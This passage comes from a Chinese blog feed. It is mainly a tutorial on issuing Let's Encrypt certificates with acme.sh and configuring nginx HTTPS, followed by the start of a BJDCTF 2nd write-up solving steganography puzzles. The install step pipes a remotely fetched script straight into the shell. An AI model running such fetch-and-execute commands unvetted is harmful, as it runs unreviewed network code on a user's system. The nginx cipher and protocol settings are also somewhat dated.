可以自动生成和更新</strong>，就来介绍一下<strong>配置的过程</strong>吧。</p><blockquote><p>当然，你还可以尝试用 Let’s Encrypt 的 <code>certbot</code> 工具来签发证书，不过要装一堆库吧，我也不记得了……</p></blockquote><p>下面的内容涉及 acme.sh 的安装，证书的签发及认证，如何安装到 nginx，以及自动更新证书、更新 acme.sh 等。</p><br><h2 id="0x01-安装-acme-sh"><a href="#0x01-安装-acme-sh" class="headerlink" title="0x01 安装 acme.sh"></a>0x01 安装 acme.sh</h2><pre class=" language-bash"><code class="language-bash">curl https://get.acme.sh <span class="token operator">|</span> sh</code></pre><p>或者</p><pre class=" language-bash"><code class="language-bash"><span class="token function">wget</span> -O -  https://get.acme.sh <span class="token operator">|</span> sh</code></pre><p>执行上面的命令，它会：</p><ul><li>从 GitHub 上下载 sh 脚本并执行</li><li>把文件解压到用户的 <code>~/.acme.sh</code>目录下</li><li>给命令行设置一个<code>acme.sh</code>的 alias 别名</li><li>最后注册一个 cron 定时任务来自动更新证书。</li></ul><p>安装完成后要<strong>自行重启命令行</strong>，或者<strong>重新加载一下<code>.bashrc</code>文件</strong>（<code>source ~/.bashrc</code>）。</p><p>然后看一下有没有生效。</p><pre class=" language-bash"><code class="language-bash">$ acme.sh -hhttps://github.com/acmesh-official/acme.shv2.8.6Usage: acme.sh  <span class="token function">command</span> <span class="token punctuation">..</span>.<span class="token punctuation">[</span>parameters<span class="token punctuation">]</span><span class="token punctuation">..</span><span class="token punctuation">..</span>Commands:  --help, -h               Show this <span class="token function">help</span> message.  --version, -v            Show version info.  --install                Install acme.sh to your system.  --uninstall              Uninstall acme.sh, and uninstall the <span class="token function">cron</span> job.  --upgrade                Upgrade acme.sh to the latest code from https://github.com/acmesh-official/acme.sh.  --issue                  Issue a cert.  --signcsr                Issue a cert from an existing csr.  --deploy                 Deploy the cert to your server.  --install-cert           Install the issued cert to apache/nginx or any other server.<span class="token comment" spellcheck="true"># ......</span></code></pre><br><h2 id="0x02-签发-SSL-证书"><a href="#0x02-签发-SSL-证书" class="headerlink" title="0x02 签发 SSL 证书"></a>0x02 签发 SSL 证书</h2><p>签发 SSL 证书需要证明这个域名是属于你的，即<strong>域名所有权</strong>，一般有两种方式验证：http 和 dns 验证。</p><p>通过 acme.sh 可以签发单域名、多域名、泛域名证书，还可以签发 ECC 证书。为了简单起见，这里以<strong>单域名证书</strong>为例，后面再拓展一下好了。</p><p><strong>下面任意一种方式只要安装成功了就行！</strong></p><p>注意：这一步<strong>只是生成了证书，并没有进行配置</strong>，因此访问网站当然上不了 https。</p><h3 id="2-1-HTTP-验证"><a href="#2-1-HTTP-验证" class="headerlink" title="2.1 HTTP 验证"></a>2.1 HTTP 验证</h3><p>这种方式 <code>acme.sh</code> 会自动在你的网站根目录下放置一个文件，来验证你的域名所有权，验证之后就签发证书，最后会自动删除验证文件。</p><p><strong>前提是要绑定的域名已经绑定到了所在服务器上，且可以通过公网进行访问！</strong></p><h4 id="2-1-1-Webroot-mode"><a href="#2-1-1-Webroot-mode" class="headerlink" title="2.1.1  Webroot mode"></a>2.1.1  Webroot mode</h4><p>假设服务器在运行着的，网站域名为 <code>example.com</code>，根目录为 <code>/home/wwwroot/example.com</code>。那么只需要执行下面这条语句就行。</p><pre class=" language-bash"><code class="language-bash">acme.sh  --issue  -d example.com  -w /home/wwwroot/example.com</code></pre><h4 id="2-1-2-Apache-Nginx-mode"><a href="#2-1-2-Apache-Nginx-mode" class="headerlink" title="2.1.2 Apache / Nginx mode"></a>2.1.2 Apache / Nginx mode</h4><p>如果用的是 Apache 或者 Nginx 服务器，可以自动寻找配置文件来进行签发。</p><pre class=" language-bash"><code class="language-bash">acme.sh  --issue  -d example.com  --apache  <span class="token comment" spellcheck="true"># Apache</span>acme.sh  --issue  -d example.com  --nginx   <span class="token comment" spellcheck="true"># Nginx</span></code></pre><p>如果找不到配置文件的话可以自行配置。</p><pre class=" language-bash"><code class="language-bash">acme.sh  --issue  -d example.com  --nginx /etc/nginx/nginx.conf  <span class="token comment" spellcheck="true"># 指定nginx的conf</span>acme.sh  --issue  -d example.com  --nginx /etc/nginx/conf.d/example.com.conf  <span class="token comment" spellcheck="true"># 指定网站的conf</span></code></pre><h4 id="2-1-3-Standalone-mode"><a href="#2-1-3-Standalone-mode" class="headerlink" title="2.1.3 Standalone mode"></a>2.1.3 Standalone mode</h4><p>这种方式下，acme.sh 会自己建立一个服务器来完成签发。主要适合的是没有建立服务器的情况，不过其实有服务器的话只要暂时关闭，不造成端口冲突就能使用。</p><p>http 模式，80端口：</p><pre class=" language-bash"><code class="language-bash">acme.sh  --issue  -d example.com  --standalone</code></pre><p>如果用了反代之类的不是 80 端口，则可以手动指定。</p><pre class=" language-bash"><code class="language-bash">acme.sh  --issue  -d example.com  --standalone --httpport 88</code></pre><p>当然它还支持 tls 模式，不是 443 端口的话也可以自行指定。</p><pre class=" language-bash"><code class="language-bash">acme.sh  --issue  -d example.com  --alpnacme.sh  --issue  -d example.com  --alpn --tlsport 8443  <span class="token comment" spellcheck="true"># 自行指定tls端口</span></code></pre><br><h3 id="2-2-DNS-验证"><a href="#2-2-DNS-验证" class="headerlink" title="2.2 DNS 验证"></a>2.2 DNS 验证</h3><p>这种方式下，不需要任何服务器，不需要任何公网 ip，只需要 dns 的解析记录即可完成验证。</p><p>比如说服务器不能直接公网访问，以及某些 VPS 直接绑定域名没备案的话是上不去的，就需要采用这种方案了。<em>（我的就是了</em></p><p>当然，手里有域名只是想生成一个证书而已也可以这么用。</p><h4 id="2-2-1-DNS-API-mode"><a href="#2-2-1-DNS-API-mode" class="headerlink" title="2.2.1 DNS API mode"></a>2.2.1 DNS API mode</h4><p>这种方式贼强大，直接可以利用域名服务商提供的 API 就可以自动帮你添加 TXT 记录完成验证和证书签发。而且60天后还可以自动完成续期。（我就是用这种方式实现哒~</p><p>比如说 CloudFlare 的，在<a href="https://dash.cloudflare.com/profile" target="_blank" rel="noopener">这里</a>获取你的API Key。可以用全局 API Key，将参数导入到命令行。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">export</span> CF_Token<span class="token operator">=</span><span class="token string">"sdfsdfsdfljlbjkljlkjsdfoiwje"</span><span class="token function">export</span> CF_Account_ID<span class="token operator">=</span><span class="token string">"xxxxxxxxxxxxx"</span></code></pre><p>为了限制权限，可以新建一个区域的 API Key. 这里只需要 Zone.DNS 的编辑权限（restrict the API Token only for write access to Zone.DNS for a single domain）就行。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">export</span> CF_Token<span class="token operator">=</span><span class="token string">"sdfsdfsdfljlbjkljlkjsdfoiwje"</span><span class="token function">export</span> CF_Account_ID<span class="token operator">=</span><span class="token string">"xxxxxxxxxxxxx"</span><span class="token function">export</span> CF_Zone_ID<span class="token operator">=</span><span class="token string">"xxxxxxxxxxxxx"</span></code></pre><p><code>Account_ID</code> 和 <code>Zone_ID</code> 在域名的管理页面右下方可以得到。</p><p>而后再签发证书。</p><pre class=" language-bash"><code class="language-bash">acme.sh --issue --dns dns_cf -d example.com </code></pre><p>之后这些配置信息会保存到 <code>~/.acme.sh/account.conf</code> 这个文件里，在证书续期或者其他利用 CF 进行验证的时候会自动调用。</p><p>当然，国内一般用的是 DNSPod，也提供了 API，类似配置就好了。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">export</span> DP_Id<span class="token operator">=</span><span class="token string">"1234"</span><span class="token function">export</span> DP_Key<span class="token operator">=</span><span class="token string">"sADDsdasdgdsf"</span>acme.sh --issue --dns dns_dp -d example.com -d www.example.com</code></pre><p><em>（这个其实就是多域名签发了）</em></p><p>更多例子参考官方 Wiki 好了→ <a href="https://github.com/acmesh-official/acme.sh/wiki/dnsapi" target="_blank" rel="noopener">How to use DNS API</a></p><h4 id="2-2-2-DNS-manual-mode"><a href="#2-2-2-DNS-manual-mode" class="headerlink" title="2.2.2 DNS manual mode"></a>2.2.2 DNS manual mode</h4><p>适合域名服务商没有提供 API 的情况，需要自己在域名配置一个 TXT 记录，且不能自动续期，每次都需要重新配置。</p><pre class=" language-bash"><code class="language-bash">acme.sh  --issue  -d example.com  --dns  -d www.example.com</code></pre><p>更多请参考官方教程 <a href="https://github.com/acmesh-official/acme.sh/wiki/DNS-manual-mode" target="_blank" rel="noopener">DNS manual mode</a>。</p><h4 id="2-2-3-DNS-alias-mode"><a href="#2-2-3-DNS-alias-mode" class="headerlink" title="2.2.3 DNS alias mode"></a>2.2.3 DNS alias mode</h4><p>如果域名服务商没有提供 API，或者是一个挺重要的域名，为了安全不希望或者不方便直接配置这个域名的解析记录，可以通过另一个没那么重要的域名（可能是专门用来签发证书的）间接进行配置。</p><p>实际上还是需要有一个域名来验证所有权啦！</p><p>更多参考官方教程 <a href="https://github.com/acmesh-official/acme.sh/wiki/DNS-alias-mode" target="_blank" rel="noopener">DNS alias mode</a> 好了。</p><br><h3 id="2-3-多域名配置"><a href="#2-3-多域名配置" class="headerlink" title="2.3 多域名配置"></a>2.3 多域名配置</h3><p>多个域名签发同一张证书。只需要在验证方式之后添加多个 <code>-d &lt;YourDomainHere&gt;</code> 参数就行。</p><pre class=" language-bash"><code class="language-bash">acme.sh --issue -d example.com -w /home/wwwroot/example.com -d www.example.comacme.sh  --issue  -d example.com  --standalone  -d www.example.com acme.sh  --issue  -d example.com  --dns  -d www.example.com</code></pre><p>也可以多个域名指定不同的验证方式，例如</p><pre class=" language-bash"><code class="language-bash">acme.sh  --issue  \-d aa.com  -w /home/wwwroot/aa.com \-d bb.com  --dns dns_cf \-d cc.com  --apache \-d dd.com  -w /home/wwwroot/dd.com</code></pre><br><h3 id="2-4-泛域名配置"><a href="#2-4-泛域名配置" class="headerlink" title="2.4 泛域名配置"></a>2.4 泛域名配置</h3><p>Wildcard certificates</p><p>同理，<strong>只需要加个<code>*</code></strong>就好。不过好像<strong>只适用于 DNS 验证</strong>的方式。</p><pre class=" language-bash"><code class="language-bash">acme.sh  --issue -d example.com  -d <span class="token string">'*.example.com'</span>  --dns dns_cf</code></pre><br><h3 id="2-5-签发-ECC-证书"><a href="#2-5-签发-ECC-证书" class="headerlink" title="2.5 签发 ECC 证书"></a>2.5 签发 ECC 证书</h3><p>默认签发的都是基于 RSA 密钥加密的证书，而 <strong>ECC</strong> (Elliptic Curve Cryptography, 椭圆曲线密码) 密钥的保密性比 RSA 更好，密钥长度更短，更能对抗量子解密等，目前现代的操作系统和浏览器都支持 ECC 证书了（Windows XP 及其之前的就算了）。</p><p><code>Let's Encrypt</code> 提供了 ECDSA 证书的签发，且 acme.sh 也支持。</p><p>我看网上的教程基本没讲 ECC 证书的签发，这里就来整一下呗！</p><p>其实只需要加上一个以 <code>ec-</code> 为前缀的 <code>--keylength</code> 参数（或 <code>-k</code>）就可以了。理论上上面的各种验证方式都适用。</p><p>比如</p><pre class=" language-bash"><code class="language-bash">acme.sh --issue -w /home/wwwroot/example.com -d example.com --keylength ec-256  <span class="token comment" spellcheck="true"># 单域名</span>acme.sh --issue -w /home/wwwroot/example.com -d example.com -d www.example.com --keylength ec-256  <span class="token comment" spellcheck="true"># 多域名</span></code></pre><p>支持以下长度的证书，一般就用 <code>ec-256</code> 就行了。</p><blockquote><ol><li><strong>ec-256 (prime256v1, “ECDSA P-256”)</strong></li><li><strong>ec-384 (secp384r1,  “ECDSA P-384”)</strong></li><li><strong>ec-521 (secp521r1,  “ECDSA P-521”, which is not supported by Let’s Encrypt yet.)</strong></li></ol></blockquote><br><h2 id="0x03-安装-copy-证书"><a href="#0x03-安装-copy-证书" class="headerlink" title="0x03 安装(copy)证书"></a>0x03 安装(copy)证书</h2><p>签发证书成功后，需要把证书安装或者复制到真正需要的地方，如 nginx / apache 的目录下。</p><p>官方说<strong>必须</strong>用下面的命令来安装证书，<strong>不能</strong>直接用 <code>~/.acme.sh/</code>目录下的证书文件，因为那只能内部使用，且未来目录结构可能会更改。</p><p>我们只需要使用 <code>--installcert</code> 命令，指定目标位置，然后证书文件就会被 copy 到相应的位置了。</p><p>其中域名是必须的，其他参数是可选的。</p><p>有必要的话，可能需要对证书文件的所属权限进行一些设置。（我这边没有问题呢，就略了吧）</p><h3 id="3-1-Nginx"><a href="#3-1-Nginx" class="headerlink" title="3.1 Nginx"></a>3.1 Nginx</h3><pre class=" language-bash"><code class="language-bash">acme.sh --installcert -d example.com \--key-file       /path/to/keyfile/in/nginx/key.pem  \--fullchain-file /path/to/fullchain/nginx/cert.pem \--reloadcmd     <span class="token string">"service nginx force-reload"</span></code></pre><p>比如你可以在 nginx 的目录下新建一个 <code>ssl</code> 目录，然后把证书安装 / copy 过去。</p><pre class=" language-bash"><code class="language-bash">acme.sh --installcert -d example.com \        --key-file   /etc/nginx/ssl/example.com.key \        --fullchain-file /etc/nginx/ssl/example.com.fullchain.cer \        --reloadcmd  <span class="token string">"service nginx force-reload"</span></code></pre><blockquote><p>这里用的是 <code>service nginx force-reload</code>, 不是 <code>service nginx reload</code>, 据测试, <code>reload</code> 并不会重新加载证书, 所以用的 <code>force-reload</code>。</p><p>Nginx 的配置 <code>ssl_certificate</code> 使用 <code>/etc/nginx/ssl/fullchain.cer</code> ，而非 <code>/etc/nginx/ssl/.cer</code> ，否则 <a href="https://www.ssllabs.com/ssltest/" target="_blank" rel="noopener">SSL Labs</a> 的测试会报 <code>Chain issues Incomplete</code> 错误。</p></blockquote><h3 id="3-2-Apache"><a href="#3-2-Apache" class="headerlink" title="3.2 Apache"></a>3.2 Apache</h3><pre class=" language-bash"><code class="language-bash">acme.sh --install-cert -d example.com \--cert-file      /path/to/certfile/in/apache/cert.pem  \--key-file       /path/to/keyfile/in/apache/key.pem  \--fullchain-file /path/to/fullchain/certfile/apache/fullchain.pem \--reloadcmd     <span class="token string">"service apache2 force-reload"</span></code></pre><p>在命令中的 <strong><code>reloadcmd</code> 参数很重要！</strong> 这个用来指定证书更新（Renew）后执行的命令，从而使续期后的证书生效。</p><p>默认 60 天就会续期一次，上面这些参数会记录下来并自动执行。（几好，贼方便</p><br><h2 id="0x04-生成-dhparam-pem-文件（可选）"><a href="#0x04-生成-dhparam-pem-文件（可选）" class="headerlink" title="0x04 生成 dhparam.pem 文件（可选）"></a>0x04 生成 dhparam.pem 文件（可选）</h2><pre class=" language-bash"><code class="language-bash">openssl dhparam -out /etc/nginx/ssl/dhparam.pem 2048</code></pre><p>这一步是为了增强 SSL 的安全性。这里生成一个更强壮的 DHE 参数。</p><blockquote><p><strong>前向安全性（Forward Secrecy）</strong>的概念很简单：客户端和服务器协商一个永不重用的密钥，并在会话结束时销毁它。服务器上的 RSA 私钥用于客户端和服务器之间的 Diffie-Hellman 密钥交换签名。从 Diffie-Hellman  握手中获取的预主密钥会用于之后的编码。因为预主密钥是特定于客户端和服务器之间建立的某个连接，并且只用在一个限定的时间内，所以称作短暂模式（Ephemeral）。</p><p>使用了前向安全性，如果一个攻击者取得了一个服务器的私钥，他是不能解码之前的通讯信息的。这个私钥仅用于 Diffie Hellman  握手签名，并不会泄露预主密钥。Diffie Hellman 算法会确保预主密钥绝不会离开客户端和服务器，而且不能被中间人攻击所拦截。</p><p>nginx 依赖于 OpenSSL 给 Diffie-Hellman （DH）的输入参数。不幸的是，这意味着  Diffie-Hellman Ephemeral（DHE）将使用 OpenSSL  的默认设置，包括一个用于密钥交换的1024位密钥。因为我们正在使用2048位证书，DHE 客户端就会使用一个要比非 DHE  客户端更弱的密钥交换。</p></blockquote><p>更多参考<a href="https://weakdh.org/sysadmin.html" target="_blank" rel="noopener">这里 Guide to Deploying Diffie-Hellman for TLS</a> 吧。</p><br><h2 id="0x05-配置-Nginx"><a href="#0x05-配置-Nginx" class="headerlink" title="0x05 配置 Nginx"></a>0x05 配置 Nginx</h2><p>没用过 Apache，这里只说 Nginx 好了。<small>（其实也不怎么会用（小声bb </small></p><p>修改网站的 conf 配置文件，加入 SSL 的相关配置。</p><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token keyword">server_name</span> example<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token keyword">listen</span>       <span class="token number">443</span> <span class="token keyword">ssl</span> http2 default_server<span class="token punctuation">;</span>    <span class="token keyword">listen</span>       <span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">443</span> <span class="token keyword">ssl</span> http2 default_server<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># ...    </span>    <span class="token comment" spellcheck="true"># ssl 相关配置</span>    <span class="token keyword">ssl_certificate</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span><span class="token keyword">ssl</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token punctuation">.</span>fullchain<span class="token punctuation">.</span>cer<span class="token punctuation">;</span>    <span class="token keyword">ssl_certificate_key</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span><span class="token keyword">ssl</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token punctuation">.</span>key<span class="token punctuation">;</span>    <span class="token keyword">ssl_dhparam</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span><span class="token keyword">ssl</span><span class="token operator">/</span>dhparam<span class="token punctuation">.</span>pem<span class="token punctuation">;</span>    <span class="token keyword">ssl_protocols</span> TLSv1 TLSv1<span class="token number">.1</span> TLSv1<span class="token number">.2</span><span class="token punctuation">;</span>    <span class="token keyword">ssl_ciphers</span> <span class="token string">'[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305|ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]:ECDHE+AES128:RSA+AES128:ECDHE+AES256:RSA+AES256:ECDHE+3DES:RSA+3DES'</span><span class="token punctuation">;</span>    <span class="token keyword">ssl_prefer_server_ciphers</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># ...</span><span class="token punctuation">}</span></code></pre><p><code>ssl_dhparam /etc/nginx/ssl/dhparam.pem;</code> 是在 0x04 步骤中生成的，可选。</p><p><code>ssl_ciphers</code>用于指定加密套件，这里采用的是 <a href="https://github.com/cloudflare/sslconfig/blob/master/conf" target="_blank" rel="noopener">CloudFlare 家的</a>，具体也不是很清楚 emmm。可以参考一下 Mozilla 的 Wiki：<a href="https://wiki.mozilla.org/Security/Server_Side_TLS" target="_blank" rel="noopener">Security/Server Side TLS</a></p><p>更多参数可以参考 nginx 的文档：<a href="http://nginx.org/en/docs/http/ngx_http_ssl_module.html" target="_blank" rel="noopener">Module ngx_http_ssl_module</a></p><h3 id="TLSv1-3（可选）"><a href="#TLSv1-3（可选）" class="headerlink" title="TLSv1.3（可选）"></a>TLSv1.3（可选）</h3><p>现在很多网站都上 <strong>TLSv1.3</strong> 了，证书检测的网站对于 TLSv1、TLSv1.1 都认为不安全了，Firefox 自 74.0 版本开始也完全放弃对加密协议 <em>TLS 1.0</em> 和 <em>TLS 1.1</em> 的支持了。</p><p>对于 TLSv1.3 的配置，需要安装最新版的 openssl（OpenSSL 1.1.1 built with TLSv1.3或更高），而后重新编译 nginx，是有点麻烦这里懒得弄了，后面需要再折腾吧。</p><h3 id="开启-HSTS（可选）"><a href="#开启-HSTS（可选）" class="headerlink" title="开启 HSTS（可选）"></a>开启 HSTS（可选）</h3><p>当然，为了更加安全，<strong>可以选择开启 HSTS</strong>（HTTP Strict Transport Security，HTTP严格传输安全协议），强制浏览器通过 https 进行访问。需要在 location 下的设置中加入一个 header。</p><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">add_header</span> Strict<span class="token operator">-</span>Transport<span class="token operator">-</span>Security <span class="token string">"max-age=31536000; includeSubDomains; preload"</span><span class="token punctuation">;</span></code></pre><p>接下来的一年（即31536000秒）中，浏览器看到 header 中包含 <code>Strict-Transport-Security</code> 的话就会自动切换到 https。</p><p>但是在首次访问网站时如果被劫持了，浏览器还是可能会通过 HTTP 明文传递信息。为此，Chrome 维护了一个 HSTS preload list，内置在浏览器中，对于 Chrome, Firefox, Opera, Safari, IE 11 and Edge 等主流浏览器也适用。可以<a href="https://hstspreload.org/" target="_blank" rel="noopener">在这里</a>提交你的域名到这个列表里。（不过提交之前要考虑好，全站上 https 噢</p><p>如果 TLS 证书无效或不可信，用户不能忽略浏览器警告继续访问网站。这就是前几天访问 GitHub (Pages) 等网站被拦下来的原因了。</p><hr><p>上面的配置完成后检查一下配置是否正确，而后重启 nginx。</p><pre class=" language-bash"><code class="language-bash">nginx -tsystemctl restart nginx</code></pre><p>之后就可以试一下能不能通过 https 来访问自己的网站啦！</p><p><strong>到这里 SSL 配置就告一段落了，下面是一些 acme.sh 的维护相关的了。</strong></p><br><h2 id="0x06-更新证书"><a href="#0x06-更新证书" class="headerlink" title="0x06 更新证书"></a>0x06 更新证书</h2><p>证书的有效期为 90 天，acme.sh 会 60 天更新（Renew）一次。</p><p>在安装 acme.sh 的时候就自动配置了一条 cron 任务了，会每天检查证书的情况。当然可以到 crontab 里看一下。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># crontab -l</span>43 0 * * * <span class="token string">"/root/.acme.sh"</span>/acme.sh --cron --home <span class="token string">"/root/.acme.sh"</span> <span class="token operator">></span> /dev/null</code></pre><p>也可以试着用上面这条命令执行看一下相关的配置是否正确。</p><p>强制更新可以这样。</p><pre class=" language-bash"><code class="language-bash">acme.sh --renew -d example.com --force  acme.sh --renew -d example.com --force --ecc  <span class="token comment" spellcheck="true"># 如果用的是ECC证书</span></code></pre><br><h2 id="0x07-停止更新证书"><a href="#0x07-停止更新证书" class="headerlink" title="0x07 停止更新证书"></a>0x07 停止更新证书</h2><p>查看证书列表</p><pre class=" language-bash"><code class="language-bash">acme.sh --list</code></pre><p>停止 Renew</p><pre class=" language-bash"><code class="language-bash">acme.sh --remove -d example.com <span class="token punctuation">[</span>--ecc<span class="token punctuation">]</span></code></pre><p>之后手动把目录下的证书移除就行。</p><br><h2 id="0x08-升级-acme-sh"><a href="#0x08-升级-acme-sh" class="headerlink" title="0x08 升级 acme.sh"></a>0x08 升级 acme.sh</h2><pre class=" language-bash"><code class="language-bash">acme.sh --upgrade    <span class="token comment" spellcheck="true"># 手动升级</span>acme.sh --upgrade --auto-upgrade    <span class="token comment" spellcheck="true"># 自动升级</span>acme.sh --upgrade --auto-upgrade 0  <span class="token comment" spellcheck="true"># 停止自动升级</span></code></pre><br><h2 id="0xFF-小结"><a href="#0xFF-小结" class="headerlink" title="0xFF 小结"></a>0xFF 小结</h2><p>除了上面这些配置之外，acme.sh 还提供了通知提醒，可以调用其他 API 来推送提醒，具体参考官方Wiki：<a href="https://github.com/acmesh-official/acme.sh/wiki/notify" target="_blank" rel="noopener">notify</a>。</p><p>总之感觉<strong>这个工具还是很实用的，大大降低了 SSL 配置的门槛</strong>呢。</p><p>草（一种植物），感觉我把官方的教程翻译了，然后又找了一些其他的资料整合起来了的亚子emmm。不过大部分还是自己手码的字啦！</p><p>实际上我这次配置的是 ECC 密钥的泛域名证书，用的是 DNS API 的模式。其实几个月前就折腾过 SSL 证书的配置了，然而过了就忘了，当时先是用 HTTP 模式进行验证，发现行不通才换的 DNS 模式。这次干脆一起理一遍好了，过程中发现原来 HTTP 模式验证比我想的还要强大，只是需求（主要是需要泛域名证书）对不上罢了。</p><p>怎么说好呢，绝对安全不大可能，都是想方设法尽可能相对安全一些呢。</p><p>希望这一篇不会浪费您的宝贵时间呢，有用的话欢迎给我买点好吃的/buy me a coffee（饿了喵</p><p>溜了溜了（</p><h2 id="References-amp-Extensive-Reading"><a href="#References-amp-Extensive-Reading" class="headerlink" title="References &amp; Extensive Reading"></a>References &amp; Extensive Reading</h2><p>下面有的是官方文档，有的是博客之类的，由于时效性有些内容可能不适用了。注意一下就吼。</p><ul><li><p><a href="https://github.com/acmesh-official/acme.sh" target="_blank" rel="noopener">acme.sh GitHub 仓库</a>  </p></li><li><p><a href="https://github.com/acmesh-official/acme.sh/wiki/%E8%AF%B4%E6%98%8E" target="_blank" rel="noopener">官方中文说明</a>  </p></li><li><p><a href="https://github.com/acmesh-official/acme.sh/wiki/How-to-issue-a-cert" target="_blank" rel="noopener">How to issue a cert（官方Wiki）</a>  </p></li><li><p><a href="https://github.com/acmesh-official/acme.sh/wiki/dnsapi" target="_blank" rel="noopener">How to use DNS API</a>  </p></li><li><p><a href="https://wiki.mozilla.org/Security/Server_Side_TLS" target="_blank" rel="noopener">Security/Server Side TLS</a>  </p></li><li><p><a href="http://nginx.org/en/docs/http/ngx_http_ssl_module.html" target="_blank" rel="noopener">（Nginx文档）Module ngx_http_ssl_module</a>  </p></li><li><p><a href="https://imququ.com/post/ecc-certificate.html" target="_blank" rel="noopener">开始使用ECC证书部署HTTPS</a>  </p></li><li><p><a href="https://www.cnblogs.com/xueweihan/p/10057656.html" target="_blank" rel="noopener">MySSL HTTPS 评级 B 升 A+</a>  </p></li><li><p><a href="https://www.acgist.com/article/541.html" target="_blank" rel="noopener">Nginx开启TLSv1.3和HTTP/2</a>  </p><p>etc.</p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Web </tag>
            
            <tag> Configuration </tag>
            
            <tag> SSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | BJDCTF 2nd WriteUp</title>
      <link href="/2020/03/23/CTF_BJDCTF2nd/"/>
      <url>/2020/03/23/CTF_BJDCTF2nd/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote><p>本届BJDCTF由江苏科技大学、北京工业大学、西南民族大学、杭州师范大学、 江苏大学、湖南工业大学（排名不分先后）联合举办</p></blockquote><p>划水划水~ 周末水了一下 BJDCTF 2nd。</p><p>看了一下，好像 BJDCTF 2020 已经有过一轮比赛了唉，这是第二届了？？？（一个月一届？</p><p>官方声称这是一个<strong>萌新赛</strong>，总体难度不算很大，于是就来玩了一下。</p><p>然而喵喵喵，的确让我知道了自己本来就是萌新。嘤嘤嘤。</p><p>题目在这里↓。</p><blockquote><p>BUUCTF 公开赛道：<a href="https://buuoj.cn/" target="_blank" rel="noopener">戳这里</a><br>hint 汇总：<a href="http://gem-love.com/BJDCTF_hint.html" target="_blank" rel="noopener">在这里</a></p></blockquote><p>这次玩的不多，主要做了点 Misc, Crypto, Reverse 的题，Web 没怎么看（后面可能会学一下 PHP、SQL 吧），pwn 没看……</p><p>简单写一下 WriteUp 吧，有的参考了一下大佬们的思路，<del>不完善的后面再补吧</del>。</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="最简单的misc-y1ng"><a href="#最简单的misc-y1ng" class="headerlink" title="最简单的misc-y1ng"></a>最简单的misc-y1ng</h3><p>压缩包伪加密，末尾两个 504B0102 之后的加密位改为 00.</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/PK00.png" alt="伪加密"></p><p>解压后看到是 IHDR ，噢是 png，补上文件头 89504E47.</p><p>得到下面的图片。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/secret.png" alt="secret"></p><p><code>424A447B79316E677A756973687561697D</code></p><p>hex 转 ASCII    </p><p><code>BJD{y1ngzuishuai}</code></p><h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>图片大小改了。。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc-A_Beautiful_Picture.png" alt="改大小"></p><p>得到</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc-A_Beautiful_Picture-DreamerJack1.png" alt=""></p><h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p><img src="/2020/03/23/CTF_BJDCTF2nd/ezbb.jpg" alt="题目"></p><p>图片二进制拼接隐写，提取得到压缩包，压缩包里是 <code>里面都是出题人.jpg</code>。</p><p>十六进制编辑器看发现是 avi 格式。改后缀播放，噢是 <del>性感</del>钉钉在线求饶 的视频。</p><p>发现插入了几个图片，还有二维码。</p><p>于是 PR 大法好。逐帧看得到下面几张二维码。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_EasyBaBa1.png" alt="Misc_EasyBaBa1"></p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_EasyBaBa2.png" alt="Misc_EasyBaBa2"></p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_EasyBaBa3.png" alt="Misc_EasyBaBa3"></p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_EasyBaBa4.png" alt="Misc_EasyBaBa4"></p><p>分别得到</p><p>6167696E5F6C   -&gt;  agin_l</p><p>6F76655F59        -&gt;   ove_Y</p><p>424A447B696D   -&gt;  BJD{im</p><p>316E677D            -&gt;  1ng}</p><p>连成一句话</p><p><code>BJD{imagin_love_Y1ng}</code></p><p><em>（这俩啥关系唉 嘤嘤嘤</em> </p><h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h3><p><img 